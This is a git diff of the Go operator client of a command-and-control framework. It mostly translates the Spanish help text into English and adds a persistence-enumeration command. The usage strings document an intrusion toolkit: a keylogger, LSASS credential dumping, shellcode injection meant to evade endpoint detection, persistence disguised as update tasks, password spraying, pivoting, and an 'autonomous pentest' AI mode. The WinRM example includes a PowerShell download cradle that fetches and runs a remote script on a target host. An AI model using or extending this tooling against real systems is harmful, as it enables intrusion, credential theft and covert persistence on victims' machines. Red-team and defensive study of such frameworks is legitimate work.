@@ -89,20 +89,20 @@ func NewCLI(c *Client) *CLI {
 	return &CLI{c: c, operator: op}
 }
 
-const agentsUsage = `uso: agents [del <id>]
+const agentsUsage = `usage: agents [del <id>]
 
-  Sin argumentos → lista todos los agentes registrados.
+  No arguments → lists all registered agents.
 
-  agents del <id>   eliminar agente y sus tareas/resultados de la DB
-                    (TAB autocompleta IDs)
+  agents del <id>   delete agent and its tasks/results from the DB
+                    (TAB completes IDs)
 
-  Columnas:
-    ID        UUID completo del agente
-    HOSTNAME  nombre del host comprometido
-    USER      usuario con el que corre el agente
-    IP        dirección IP de origen
-    TRANSP    transporte: http | mtls | smb
-    STATUS    segundos/minutos desde el último beacon, o "disconnected"
+  Columns:
+    ID        full agent UUID
+    HOSTNAME  compromised host name
+    USER      user the agent is running as
+    IP        source IP address
+    TRANSP    transport: http | mtls | smb
+    STATUS    seconds/minutes since last beacon, or "disconnected"
 `
 
 func (cl *CLI) Run() {
@@ -152,7 +152,7 @@ func (cl *CLI) Run() {
 		if strings.HasPrefix(line, "!") {
 			rest := strings.TrimSpace(line[1:])
 			if rest == "" {
-				fmt.Println("uso: !<comando>  ej: !whoami")
+				fmt.Println("usage: !<command>  e.g.: !whoami")
 			} else {
 				cl.runLocalShell(rest)
 			}
@@ -182,14 +182,14 @@ func (cl *CLI) dispatch(parts []string) {
 		}
 		if len(parts) >= 2 && parts[1] == "del" {
 			if len(parts) < 3 {
-				warn("uso: agents del <agent_id>  [TAB completa IDs]")
+				warn("usage: agents del <agent_id>  [TAB completes IDs]")
 				return
 			}
 			if err := cl.c.DeleteAgent(parts[2]); err != nil {
 				errLine("%s", err)
 				return
 			}
-			ok("agente %s%s%s eliminado", cBYellow, parts[2], cReset)
+			ok("agent %s%s%s deleted", cBYellow, parts[2], cReset)
 			if cl.current != "" && strings.HasPrefix(cl.current, parts[2]) {
 				cl.current = ""
 			}
@@ -413,10 +413,10 @@ func (cl *CLI) dispatch(parts []string) {
 		if cl.requireAgent(); cl.current == "" {
 			return
 		}
-		fmt.Print(pfxWarn + "esto borrará el agente del sistema — confirmar [s/N]: ")
+		fmt.Print(pfxWarn + "this will delete the agent record — confirm [y/N]: ")
 		var confirm string
 		fmt.Scanln(&confirm)
-		if strings.ToLower(confirm) == "s" {
+		if strings.ToLower(confirm) == "y" {
 			cl.cmdTask(cl.current, "CLEANUP", "", nil)
 			cl.current = ""
 		}
@@ -1008,7 +1008,7 @@ func (cl *CLI) cmdListener(args []string) {
 		ok("job #%s%d%s stopped", cBYellow, id, cReset)
 
 	default:
-		warn("uso: listener start|stop ...")
+		warn("usage: listener start|stop ...")
 	}
 }
 
@@ -1212,7 +1212,7 @@ examples:
 		"dll":       "agent.dll",
 		"elf":       "linux ELF",
 		"bin":       "shellcode .bin",
-		"enc":       "shellcode cifrado",
+		"enc":       "shellcode encrypted",
 		"stub":      "decryptor stub.c",
 		"html":      "html smuggler",
 		"lnk":       "shortcut .lnk",
@@ -1232,34 +1232,46 @@ examples:
 
 // ── persist ───────────────────────────────────────────────────────────────
 
-const persistUsage = `uso: persist <method> <cmd> [name]
+const persistUsage = `usage: persist <method> <cmd> [name]
 
   Windows methods:
-    registry   HKCU Run key (requiere usuario)
-    schtask    Scheduled task (requiere usuario)
-    startup    Carpeta Startup .bat (requiere usuario)
-    service    Windows service (requiere admin)
-    wmi        WMI event subscription (requiere admin)
+    registry   HKCU Run key (requires user)
+    schtask    Scheduled task (requires user)
+    startup    Startup folder .bat (requires user)
+    service    Windows service (requires admin)
+    wmi        WMI event subscription (requires admin)
+    enum       list all installed persistence on this host
 
   Linux methods:
     crontab    @reboot cron entry
     bashrc     ~/.bashrc entry
-    rc.local   /etc/rc.local entry (requiere root)
-    systemd    systemd service (user o system)
+    rc.local   /etc/rc.local entry (requires root)
+    systemd    systemd service (user or system)
+    enum       list all installed persistence on this host
 
-  name: nombre del servicio/tarea (opcional, defecto: WindowsUpdate)
+  name: service/task name (optional, default: WindowsUpdate)
 
-ejemplos:
+examples:
   persist registry "C:\Users\user\AppData\Local\svc.exe"
   persist schtask "C:\Windows\Temp\agent.exe" MicrosoftUpdate
-  persist crontab "/tmp/agent" MicrosoftEdgeUpdate`
+  persist crontab "/tmp/agent" MicrosoftEdgeUpdate
+  persist enum`
 
 func (cl *CLI) cmdPersist(args []string) {
-	if len(args) < 2 {
+	if len(args) == 0 {
 		fmt.Println(persistUsage)
 		return
 	}
 	method := args[0]
+	if method == "enum" || method == "check" || method == "list" {
+		argJSON, _ := json.Marshal(map[string]string{"method": method})
+		cl.cmdTask(cl.current, "PERSIST", string(argJSON), nil)
+		return
+	}
+	if len(args) < 2 {
+		fmt.Println(persistUsage)
+		return
+	}
 	cmd := args[1]
 	name := ""
 	if len(args) >= 3 {
@@ -1271,16 +1283,16 @@ func (cl *CLI) cmdPersist(args []string) {
 
 // ── fork & run ────────────────────────────────────────────────────────────
 
-const forkrunUsage = `uso: forkrun <shellcode.bin> [sacrificial_process]
+const forkrunUsage = `usage: forkrun <shellcode.bin> [sacrificial_process]
 
-  Inyecta shellcode en un proceso sacrificial para proteger el agente.
+  Injects shellcode into a sacrificial process to protect the agent.
 
-  sacrificial_process: ruta completa del proceso (defecto: svchost.exe)
+  sacrificial_process: full process path (default: svchost.exe)
 
-  El shellcode se ejecuta en un proceso separado que se termina al finalizar.
-  El output se captura y devuelve como resultado.
+  The shellcode runs in a separate process that is terminated upon completion.
+  Output is captured and returned as the task result.
 
-ejemplos:
+examples:
   forkrun /tmp/beacon.bin
   forkrun /tmp/beacon.bin C:\Windows\System32\notepad.exe`
 
@@ -1305,15 +1317,15 @@ func (cl *CLI) cmdForkRun(args []string) {
 
 // ── early-bird APC injection ──────────────────────────────────────────────
 
-const injectApcUsage = `uso: inject-apc <shellcode.bin> [sacrificial_process]
+const injectApcUsage = `usage: inject-apc <shellcode.bin> [sacrificial_process]
 
-  Inyecta shellcode mediante QueueUserAPC (early-bird) en un proceso sacrificial.
-  El APC se ejecuta antes del entry point, antes de que el EDR pueda inspeccionar.
-  No sobreescribe RIP — más estable que thread hijacking en algunos entornos.
+  Injects shellcode via QueueUserAPC (early-bird) into a sacrificial process.
+  The APC runs before the entry point, before the EDR can inspect.
+  Does not overwrite RIP — more stable than thread hijacking in some environments.
 
-  sacrificial_process: ruta completa (defecto: RuntimeBroker.exe / dllhost.exe)
+  sacrificial_process: full path (default: RuntimeBroker.exe / dllhost.exe)
 
-ejemplos:
+examples:
   inject-apc /tmp/beacon.bin
   inject-apc /tmp/beacon.bin C:\Windows\System32\dllhost.exe`
 
@@ -1337,15 +1349,15 @@ func (cl *CLI) cmdInjectAPC(args []string) {
 
 // ── execute assembly ──────────────────────────────────────────────────────
 
-const execAsmUsage = `uso: dotnet-asm <assembly.exe> [sacrificial_process]
+const execAsmUsage = `usage: dotnet-asm <assembly.exe> [sacrificial_process]
 
-  Ejecuta un .NET assembly en memoria usando un proceso sacrificial.
-  El assembly se convierte a shellcode con donut en el servidor (go-donut).
-  Combina fork-run con conversión automática — no requiere donut local.
+  Executes a .NET assembly in memory using a sacrificial process.
+  The assembly is converted to shellcode with donut on the server (go-donut).
+  Combines fork-run with automatic conversion — no local donut required.
 
-  Requiere: go-donut disponible en el servidor (go run github.com/Binject/go-donut).
+  Requires: go-donut available on the server (go run github.com/Binject/go-donut).
 
-ejemplos:
+examples:
   dotnet-asm /tmp/Rubeus.exe
   dotnet-asm /tmp/SharpHound.exe C:\Windows\System32\dllhost.exe`
 
@@ -1376,27 +1388,27 @@ func (cl *CLI) cmdExecAsm(args []string) {
 
 // ── dotnet-exec (native CLR host, in-process) ────────────────────────────
 
-const execDotnetUsage = `uso: dotnet-exec <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]
+const execDotnetUsage = `usage: dotnet-exec <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]
 
-  Ejecuta un .NET assembly IN-PROCESS en el agente usando el CLR hosting nativo
+  Executes a .NET assembly IN-PROCESS in the agent using native CLR hosting
   (mscoree.dll COM API): ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost.
 
-  A diferencia de dotnet-asm (que convierte a shellcode con donut y usa fork-run),
-  dotnet-exec carga el CLR directamente en el proceso del agente y captura la
-  salida de Console.Write* mediante redirección de pipe.
+  Unlike dotnet-asm (which converts to shellcode with donut and uses fork-run),
+  dotnet-exec loads the CLR directly into the agent process and captures
+  Console.Write* output via pipe redirection.
 
-  Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute
+  Equivalent to: Cobalt Strike execute-assembly / Havoc dotnet inline-execute
 
-  --type   Nombre completo de la clase de entrada (autodetectado si se omite)
-           Ejemplo: --type Rubeus.Program
-  --method Nombre del método estático de entrada (default: Main)
+  --type   Full entry class name (auto-detected if omitted)
+           Example: --type Rubeus.Program
+  --method Static entry method name (default: Main)
 
-  Herramientas soportadas (autodetección): Rubeus, SharpHound, Certify,
+  Supported tools (auto-detection): Rubeus, SharpHound, Certify,
   SharpView, Seatbelt, InternalMonologue, SharpUp, ADRecon, etc.
 
-  Nota: requiere .NET Framework 4.x en el host Windows.
+  Note: requires .NET Framework 4.x on the Windows host.
 
-ejemplos:
+examples:
   dotnet-exec /tmp/Rubeus.exe kerberoast /outfile:hashes.txt
   dotnet-exec /tmp/SharpHound.exe -c All
   dotnet-exec /tmp/Seatbelt.exe -group=all
@@ -1455,11 +1467,11 @@ func (cl *CLI) cmdExecDotnet(args []string) {
 
 // ── keylogger ─────────────────────────────────────────────────────────────
 
-const keylogUsage = `uso: keylog <start|stop|dump>
+const keylogUsage = `usage: keylog <start|stop|dump>
 
-  start  — instala hook de teclado global (WH_KEYBOARD_LL)
-  stop   — desinstala el hook y detiene la captura
-  dump   — devuelve y vacía el buffer capturado hasta ahora`
+  start  — installs global keyboard hook (WH_KEYBOARD_LL)
+  stop   — uninstalls the hook and stops capture
+  dump   — returns and clears the captured buffer`
 
 func (cl *CLI) cmdKeylog(args []string) {
 	if len(args) == 0 {
@@ -1486,14 +1498,14 @@ func (cl *CLI) cmdClip() {
 
 // ── LSASS minidump ────────────────────────────────────────────────────────
 
-const minidumpUsage = `uso: minidump [pid]
-  Vuelca la memoria de lsass.exe (o el PID especificado) como archivo .dmp
-  y lo sube al servidor. Requiere privilegios de administrador.
+const minidumpUsage = `usage: minidump [pid]
+  Dumps lsass.exe memory (or the specified PID) as a .dmp file
+  and uploads it to the server. Requires administrator privileges.
 
-  Sin PID: busca lsass.exe automáticamente.
-  Con PID: usa el proceso indicado.
+  No PID: auto-locates lsass.exe.
+  With PID: uses the specified process.
 
-Ejemplos:
+Examples:
   minidump
   minidump 820`
 
@@ -1507,27 +1519,27 @@ func (cl *CLI) cmdMinidump(args []string) {
 
 // ── Port scan ─────────────────────────────────────────────────────────────
 
-const portScanUsage = `uso: port-scan <target> [ports] [timeout_ms]
-  Escaneo TCP connect desde el agente. Sin puertos → host discovery (ARP + TCP).
+const portScanUsage = `usage: port-scan <target> [ports] [timeout_ms]
+  TCP connect scan from the agent. No ports → host discovery (ARP + TCP).
 
-  target:     192.168.1.1                IP individual
-              192.168.1.0/24             CIDR (toda la subred)
-              192.168.1.1-20             rango último octeto
-              192.168.1.1-192.168.1.50  rango IP completo
+  target:     192.168.1.1                individual IP
+              192.168.1.0/24             CIDR (entire subnet)
+              192.168.1.1-20             last octet range
+              192.168.1.1-192.168.1.50  full IP range
               dc01.corp.local            hostname
-  ports:      omitido                   host discovery (ARP + TCP fallback)
-              22,80,443                 puertos individuales
-              1-1024                    rango
-              22,80,443-500             mixto
-  timeout_ms: timeout por prueba en ms (default 500)
+  ports:      omitted                   host discovery (ARP + TCP fallback)
+              22,80,443                 individual ports
+              1-1024                    range
+              22,80,443-500             mixed
+  timeout_ms: per-probe timeout in ms (default 500)
 
-Host discovery (sin puertos):
-  Windows — SendARP (iphlpapi): sin elevación, devuelve MAC
-  Linux   — UDP trigger + /proc/net/arp: sin raw sockets, devuelve MAC
-  Fallback — TCP connect a puertos comunes (para subredes enrutadas)
+Host discovery (no ports):
+  Windows — SendARP (iphlpapi): no elevation, returns MAC
+  Linux   — UDP trigger + /proc/net/arp: no raw sockets, returns MAC
+  Fallback — TCP connect to common ports (for routed subnets)
 
-Ejemplos:
-  port-scan 192.168.1.0/24               detectar hosts vivos
+Examples:
+  port-scan 192.168.1.0/24               detect live hosts
   port-scan 192.168.1.0/24 22,80,445,3389 300
   port-scan 192.168.1.1-20 80,443,8080
   port-scan dc01.corp.local 88,135,389,445,636,3268`
@@ -1543,22 +1555,22 @@ func (cl *CLI) cmdPortScan(args []string) {
 
 // ── SMB named pipe pivot server ───────────────────────────────────────────
 
-const linkUsage = `uso: link start [pipename]  — iniciar servidor named pipe (pivot SMB)
-     link stop               — detener servidor named pipe
+const linkUsage = `usage: link start [pipename]  — start named pipe server (SMB pivot)
+       link stop                — stop named pipe server
 
-  Hace que el agente escuche en un named pipe de Windows.
-  Los agentes hijos compilados con transporte SMB se conectan a través de él,
-  y el agente pivot reenvía su tráfico al servidor C2 (lateral movement).
+  Makes the agent listen on a Windows named pipe.
+  Child agents compiled with SMB transport connect through it,
+  and the pivot agent forwards their traffic to the C2 server (lateral movement).
 
-  Solo disponible en Windows. Requiere que el agente sea alcanzable vía SMB.
+  Windows only. Requires the agent to be reachable via SMB.
 
-  Pasos:
-    1. link start                   ← activa el servidor en \\.\pipe\svcctl
-    2. build smb <host> 60 20 smb-pipe=\\TARGET\pipe\svcctl  ← compilar agente hijo
-    3. Ejecutar el agente hijo en el sistema destino
-    4. agents  ← el agente hijo aparece en la lista
+  Steps:
+    1. link start                   ← activates the server at \\.\pipe\svcctl
+    2. build smb <host> 60 20 smb-pipe=\\TARGET\pipe\svcctl  ← compile child agent
+    3. Run the child agent on the target system
+    4. agents  ← the child agent appears in the list
 
-ejemplos:
+examples:
   link start
   link start \\.\pipe\evil
   link stop`
@@ -1584,19 +1596,19 @@ func (cl *CLI) cmdLink(args []string) {
 
 // ── reverse SOCKS5 ───────────────────────────────────────────────────────
 
-const rsocksUsage = `uso: rsocks start [socks_port] [user:pass]   — iniciar reverse SOCKS5 (defecto :1080)
-     rsocks stop                              — detener
+const rsocksUsage = `usage: rsocks start [socks_port] [user:pass]   — start reverse SOCKS5 (default :1080)
+       rsocks stop                               — stop
 
-  El agente conecta HACIA FUERA al servidor C2 y crea un túnel reverso.
-  El operador usa 127.0.0.1:<socks_port> como proxy SOCKS5 hacia la red interna.
+  The agent connects OUTBOUND to the C2 server and creates a reverse tunnel.
+  The operator uses 127.0.0.1:<socks_port> as a SOCKS5 proxy into the internal network.
 
-  A diferencia del SOCKS5 directo, funciona aunque el agente esté detrás de NAT
-  o un firewall que bloquee conexiones entrantes.
+  Unlike direct SOCKS5, works even when the agent is behind NAT
+  or a firewall that blocks incoming connections.
 
-  Configura proxychains: socks5  127.0.0.1  1080
-  Con auth:             socks5  127.0.0.1  1080  user  pass
+  Configure proxychains: socks5  127.0.0.1  1080
+  With auth:             socks5  127.0.0.1  1080  user  pass
 
-ejemplos:
+examples:
   rsocks start
   rsocks start 9050
   rsocks start 9050 redteam:S3cr3t
@@ -1646,21 +1658,21 @@ func (cl *CLI) cmdRSocks(args []string) {
 
 // ── HTTP pivot server ─────────────────────────────────────────────────────
 
-const httpivotUsage = `uso: httpivot start [port]   — iniciar proxy HTTP interno (defecto :8888)
-     httpivot stop            — detener
+const httpivotUsage = `usage: httpivot start [port]   — start internal HTTP proxy (default :8888)
+       httpivot stop             — stop
 
-  El agente escucha en el puerto dado como servidor HTTP.
-  Los agentes hijo compilados apuntando a http://PIVOT:PORT se conectan aquí.
-  El pivot reenvía su tráfico al servidor C2 real (transparent HTTP proxy).
+  The agent listens on the given port as an HTTP server.
+  Child agents compiled pointing to http://PIVOT:PORT connect here.
+  The pivot forwards their traffic to the real C2 server (transparent HTTP proxy).
 
-  Útil cuando SMB está filtrado entre segmentos pero HTTP está permitido.
+  Useful when SMB is filtered between segments but HTTP is allowed.
 
-  Pasos:
-    1. httpivot start 8080          ← activa el proxy en el agente
-    2. build http <pivot_ip>:8080   ← compilar agente hijo
-    3. agents                       ← el hijo aparece como agente normal
+  Steps:
+    1. httpivot start 8080          ← activates the proxy on the agent
+    2. build http <pivot_ip>:8080   ← compile child agent
+    3. agents                       ← the child appears as a normal agent
 
-ejemplos:
+examples:
   httpivot start
   httpivot start 8080
   httpivot stop`
@@ -1686,17 +1698,17 @@ func (cl *CLI) cmdHTTPivot(args []string) {
 
 // ── WinRM lateral movement ────────────────────────────────────────────────
 
-const winrmUsage = `uso: winrm exec  <target> <user> <pass> <cmd>
-     winrm deploy <target> <user> <pass> <powershell_cradle>
+const winrmUsage = `usage: winrm exec  <target> <user> <pass> <cmd>
+       winrm deploy <target> <user> <pass> <powershell_cradle>
 
-  Ejecuta comandos en un host Windows remoto a través de WinRM (puerto 5985).
-  Usa PowerShell Invoke-Command — requiere agente Windows con PS disponible.
-  La contraseña NO aparece en la lista de procesos (usa -EncodedCommand).
+  Executes commands on a remote Windows host via WinRM (port 5985).
+  Uses PowerShell Invoke-Command — requires a Windows agent with PS available.
+  The password does NOT appear in the process list (uses -EncodedCommand).
 
-  deploy: ejecuta un payload PS (cradle de descarga) en el host remoto.
-          Útil para desplegar un nuevo agente en una máquina interna.
+  deploy: executes a PS payload (download cradle) on the remote host.
+          Useful for deploying a new agent on an internal machine.
 
-ejemplos:
+examples:
   winrm exec  192.168.1.10 CORP\\Administrator Passw0rd! whoami
   winrm exec  dc01 alice@corp.local P@ss123 "Get-ADUser -Filter *"
   winrm deploy 192.168.1.20 CORP\\admin P@ss "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"
@@ -1729,20 +1741,20 @@ func (cl *CLI) cmdWinRM(args []string) {
 
 // ── role management ───────────────────────────────────────────────────────
 
-const roleUsage = `uso: role <subcommand>
+const roleUsage = `usage: role <subcommand>
 
-  list                        listar roles de todos los operadores
-  set <operator> <role>       asignar rol (admin|operator|viewer)
+  list                        list roles for all operators
+  set <operator> <role>       assign role (admin|operator|viewer)
 
-  Solo los operadores con rol 'admin' pueden usar este comando.
-  El rol por defecto es 'operator' si no se ha asignado ninguno.
+  Only operators with the 'admin' role can use this command.
+  The default role is 'operator' if none has been assigned.
 
-  Permisos por rol:
-    viewer    sólo lectura (agents, results, report)
-    operator  tareas + build + creds (defecto)
-    admin     todo + gestión de roles
+  Permissions by role:
+    viewer    read-only (agents, results, report)
+    operator  tasks + build + creds (default)
+    admin     all + role management
 
-ejemplos:
+examples:
   role list
   role set alice admin
   role set bob viewer`
@@ -1786,7 +1798,7 @@ func (cl *CLI) cmdRole(args []string) {
 
 	case "set":
 		if len(args) < 3 {
-			warn("uso: role set <operator> <role>")
+			warn("usage: role set <operator> <role>")
 			return
 		}
 		op, role := args[1], args[2]
@@ -1887,22 +1899,22 @@ func (cl *CLI) cmdPortFwd(args []string) {
 // Accepts a file path OR a short name resolved from bof/**/.
 func (cl *CLI) cmdBOF(args []string) {
 	if len(args) < 1 {
-		fmt.Print(`uso: bof <nombre|archivo.o> [val:tipo ...]
+		fmt.Print(`usage: bof <name|file.o> [val:type ...]
 
-subcomandos:
-  bof install        descargar/actualizar colecciones de BOFs en bof/
-  bof list           listar BOFs disponibles por nombre
+subcommands:
+  bof install        download/update BOF collections in bof/
+  bof list           list available BOFs by name
 
-tipos de argumento:
-  texto:z            C string (null-terminated)
-  texto:Z            wide string (UTF-16LE)
+argument types:
+  text:z             C string (null-terminated)
+  text:Z             wide string (UTF-16LE)
   42:i               int32
   256:s              int16
-  /ruta/datos.bin:b  fichero binario
+  /path/data.bin:b   binary file
 
-ejemplos:
-  bof arp                           resolución por nombre corto
-  bof nanodump                      LSASS dump (requiere SeDebugPrivilege)
+examples:
+  bof arp                           resolve by short name
+  bof nanodump                      LSASS dump (requires SeDebugPrivilege)
   bof ldapsearch DC=corp,DC=com:z LDAP:z (LDAP 389):i
   bof /tmp/custom.x64.o arg:z
 `)
@@ -2101,10 +2113,10 @@ func (cl *CLI) cmdChat() {
 			break
 		}
 		if err := cl.c.ChatPost(line); err != nil {
-			fmt.Println("error enviando mensaje:", err)
+			fmt.Println("error sending message:", err)
 		}
 	}
-	fmt.Println("\033[33m-- saliendo del chat --\033[0m")
+	fmt.Println("\033[33m-- leaving chat --\033[0m")
 }
 
 // agentMonitor polls agents every 10s and prints connect/disconnect notifications.
@@ -2457,7 +2469,7 @@ func (cl *CLI) updatePrompt() {
 
 func (cl *CLI) requireAgent() {
 	if cl.current == "" {
-		warn("ningún agente seleccionado — usa %suse <id>%s", cBCyan, cReset)
+		warn("no agent selected — use %suse <id>%s", cBCyan, cReset)
 	}
 }
 
@@ -2519,76 +2531,76 @@ func printHelp() {
 	const b = cBGreen // section header = bold green
 	const r = cReset
 	fmt.Printf(`
-%sSERVIDOR%s
-  agents                             lista agentes / agents del <id>
-  use <id>                           seleccionar agente  [TAB completa]
-  back                               deseleccionar agente
-  kill [id]                          enviar KILL al agente
-  jobs                               listeners activos
-  plugins list                       listar módulos comunitarios
-  plugins reload                     redescubrir módulos instalados
-  plugins run <id> [json]            ejecutar un módulo read-only
-  plugins runs <id> [limit]          historial de ejecuciones
-  listener start http|mtls|tcp <port> arrancar listener HTTP/mTLS/TCP raw
-  listener start dns <port> <domain> arrancar listener DNS
+%sSERVER%s
+  agents                             list agents / agents del <id>
+  use <id>                           select agent  [TAB completes]
+  back                               deselect agent
+  kill [id]                          send KILL to agent
+  jobs                               active listeners
+  plugins list                       list community modules
+  plugins reload                     rediscover installed modules
+  plugins run <id> [json]            run a read-only module
+  plugins runs <id> [limit]          execution history
+  listener start http|mtls|tcp <port> start HTTP/mTLS/TCP raw listener
+  listener start dns <port> <domain> start DNS listener
   listener start wstunnel <port>     WS bridge → operator port
-  listener stop <id>                 parar listener
-  build http|mtls|dns <host> [opts]  compilar payload
-  gencert <label>                    cert mTLS de agente
-  operators                          operadores conectados
-  chat                               chat entre operadores
-  role list / role set <op> <role>   gestión de roles
-  report [--ai]                      reporte HTML + MITRE ATT&CK
-  help start                         guía de inicio rápido
+  listener stop <id>                 stop listener
+  build http|mtls|dns <host> [opts]  compile payload
+  gencert <label>                    agent mTLS cert
+  operators                          connected operators
+  chat                               operator chat
+  role list / role set <op> <role>   role management
+  report [--ai]                      HTML report + MITRE ATT&CK
+  help start                         quick-start guide
 
-%sAGENTE%s  (requiere: use <id>)
-  info                               detalles del agente
-  shell <cmd>                        ejecutar comando shell
-  sleep <sec> <jitter%%>              cambiar beacon
-  results [n]                        historial de resultados
-  cleanup                            auto-eliminar del sistema
+%sAGENT%s  (requires: use <id>)
+  info                               agent details
+  shell <cmd>                        run shell command
+  sleep <sec> <jitter%%>              change beacon interval
+  results [n]                        result history
+  cleanup                            self-delete from system
 
 %sFILESYSTEM%s
   pwd / cd / ls / mkdir / rm / cat / env
 
-%sTRANSFERENCIA%s
-  download <ruta_remota>             agente → servidor
-  upload <local> <ruta_remota>       servidor → agente
+%sTRANSFER%s
+  download <remote_path>             agent → server
+  upload <local> <remote_path>       server → agent
 
-%sPOST-EXPLOTACIÓN%s
-  ps                                 listar procesos
-  screenshot                         captura → servidor
-  inject <pid> <sc.bin>              inyección remota
-  inject-apc <sc.bin> [proc]         APC early-bird (evasivo)
-  dotnet-asm <asm.exe> [proc]        .NET assembly en memoria
-  forkrun <sc.bin> [proc]            shellcode en proceso sacrificial
-  stage2 <sc.bin>                    handoff a Sliver/CS/Havoc
-  bof <nombre|archivo.o> [args]      ejecutar BOF
-  bof list / bof install             listar / descargar colecciones
+%sPOST-EXPLOITATION%s
+  ps                                 list processes
+  screenshot                         capture → server
+  inject <pid> <sc.bin>              remote injection
+  inject-apc <sc.bin> [proc]         APC early-bird (evasive)
+  dotnet-asm <asm.exe> [proc]        .NET assembly in memory
+  forkrun <sc.bin> [proc]            shellcode in sacrificial process
+  stage2 <sc.bin>                    handoff to Sliver/CS/Havoc
+  bof <name|file.o> [args]           run BOF
+  bof list / bof install             list / download collections
   token whoami|steal <pid>|make <u> <p>|drop
   keylog start|stop|dump             keylogger WH_KEYBOARD_LL
-  clip                               leer portapapeles
-  minidump [pid]                     volcar lsass → .dmp
-  port-scan <target> <ports> [ms]    TCP scan desde el agente
+  clip                               read clipboard
+  minidump [pid]                     dump lsass → .dmp
+  port-scan <target> <ports> [ms]    TCP scan from agent
   persist <method> <cmd> [name]
     Windows: registry|schtask|startup|service|wmi
     Linux:   crontab|bashrc|rc.local|systemd
 
 %sPIVOT%s
-  socks <port> [user:pass]           SOCKS5 directo
+  socks <port> [user:pass]           direct SOCKS5
   socks stop
-  rsocks start [port] [user:pass]    Reverse SOCKS5 (bypasa NAT)
+  rsocks start [port] [user:pass]    Reverse SOCKS5 (bypasses NAT)
   rsocks stop
   portfwd add [tcp|udp] <lp> <rh> <rp>
   portfwd del [tcp|udp] <lport> / portfwd list
   link start [pipename] / link stop  named pipe SMB (P2P)
   httpivot start [port] / httpivot stop
-  winrm exec  <t> <u> <p> <cmd>     ejecutar vía WinRM
-  winrm deploy <t> <u> <p> <cradle> desplegar agente remoto
+  winrm exec  <t> <u> <p> <cmd>     execute via WinRM
+  winrm deploy <t> <u> <p> <cradle> deploy remote agent
 
-%sHERRAMIENTAS LOCALES%s
-  !<cmd>                             ejecutar en Kali
-  setup                              verificar herramientas
+%sLOCAL TOOLS%s
+  !<cmd>                             run on Kali
+  setup                              check tools
   scan <target> [-p ports]           nmap
   enum <target> [-u u -p p]          nxc SMB/LDAP
   spray <target> -u list -p pass     password spray
@@ -2598,7 +2610,7 @@ func printHelp() {
   kerbrute enum|brute|spray -d dom --dc <target> <wordlist>
 
 %sIMPACKET%s
-  Ejecución remota:
+  Remote execution:
     wmiexec / psexec / smbexec / dcomexec / atexec
     → <t> -u u [-p p] [-d d] [-H h] [cmd]
 
@@ -2608,21 +2620,21 @@ func printHelp() {
     getst       <t> -d d -u u -spn <spn> [-impersonate u]
     describeticket <t.ccache>  /  ticketconverter <in> <out>
 
-  Enumeración AD/SMB:
+  AD/SMB enumeration:
     lookupsid / samrdump / rpcdump / dumpntlminfo
     getadusers / getadcomputers / finddelegation
     getlaps / getgpp
     → <t> -d d -u u [-p p]
 
-  Red y servicios:
+  Network and services:
     mssqlclient / smbclient / smbserver / ntlmrelayx
 
-  Escalada AD / DACL:
+  AD escalation / DACL:
     dacledit / rbcd / addcomputer / changepasswd / dpapi
     → <t> -d d -u u -action read|write [opts]
 
   Passthrough:
-    impacket <herramienta> [args...]   TAB completa 50+ nombres
+    impacket <tool> [args...]   TAB completes 50+ names
 
 %sCERTIPY (ADCS)%s
   certipy find   <dc-ip> -u u@d [-p p] [-vulnerable]
@@ -2634,24 +2646,24 @@ func printHelp() {
   certipy forge  [-ca-pfx ca.pfx] -upn upn@domain
   certipy template|account|cert|parse [args...]
 
-%sCREDENCIALES%s
-  cred list [-q filtro]
+%sCREDENTIALS%s
+  cred list [-q filter]
   cred add -u user -s secret [-t type] [-d dom] [-H host]
   cred del <id>  /  cred import <file>  /  cred dump
-  tipos: plaintext | ntlm | krb5 | certificate
+  types: plaintext | ntlm | krb5 | certificate
 
-%sIA (Ollama)%s
-  ai chat [-m modelo] [-url url]     chat interactivo
-  ai auto <target> -d <domain>       pentest autónomo
+%sAI (Ollama)%s
+  ai chat [-m model] [-url url]      interactive chat
+  ai auto <target> -d <domain>       autonomous pentest
 
-%sGUI WEB%s
-  gui start <port>                   arrancar interfaz web en 127.0.0.1:port
-  gui stop                           parar interfaz web
-  gui status                         mostrar puerto y URL con token
-  (al lanzar el cliente: -gui-port <p> [-gui-only])
+%sWEB GUI%s
+  gui start <port>                   start web interface at 127.0.0.1:port
+  gui stop                           stop web interface
+  gui status                         show port and URL with token
+  (when launching client: -gui-port <p> [-gui-only])
 
-  help start  →  guía de inicio rápido
-  impacket <nombre> --help  →  ayuda de herramienta específica
+  help start  →  quick-start guide
+  impacket <name> --help  →  tool-specific help
 
 `, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r, b, r)
 }
@@ -2662,43 +2674,43 @@ func printQuickstart() {
 │                  C2 — QUICKSTART                    │
 └─────────────────────────────────────────────────────────────────┘
 
-EN EL SERVIDOR (una sola vez):
+ON THE SERVER (once):
   $ go build -o bin/c2-server ./cmd/server/
   $ ./bin/c2-server
 
-EN EL VPS (el admin genera perfiles fuera de banda):
+ON THE VPS (admin generates profiles out-of-band):
   $ c2-server new-operator -name alice
-    → genera alice.json (SSH tunnel)
+    → generates alice.json (SSH tunnel)
   $ c2-server new-operator -name alice -via-ws wss://xxx.trycloudflare.com/ws
-    → genera alice.json con WS tunnel pre-configurado
+    → generates alice.json with WS tunnel pre-configured
 
-OPCIÓN A — SSH tunnel (sin Cloudflare):
-  1. En el operador:  ssh -L 31337:127.0.0.1:31337 user@<vps> -N &
-  2. Conectar:        c2-client -profile alice.json
+OPTION A — SSH tunnel (no Cloudflare):
+  1. On the operator:  ssh -L 31337:127.0.0.1:31337 user@<vps> -N &
+  2. Connect:          c2-client -profile alice.json
 
-OPCIÓN B — Cloudflare Tunnel (sin SSH, desde cualquier red):
-  1. En el VPS:
-     listener start wstunnel 40000         ← en el cliente C2
+OPTION B — Cloudflare Tunnel (no SSH, from any network):
+  1. On the VPS:
+     listener start wstunnel 40000         ← in the C2 client
      cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate
      c2-server new-operator -name alice -via-ws wss://<uuid>.trycloudflare.com/ws
 
-  2. En el operador:
-     c2-client -profile alice.json    ← ya lleva la URL de WS
+  2. On the operator:
+     c2-client -profile alice.json    ← WS URL already embedded
 
-OPERAR:
+OPERATE:
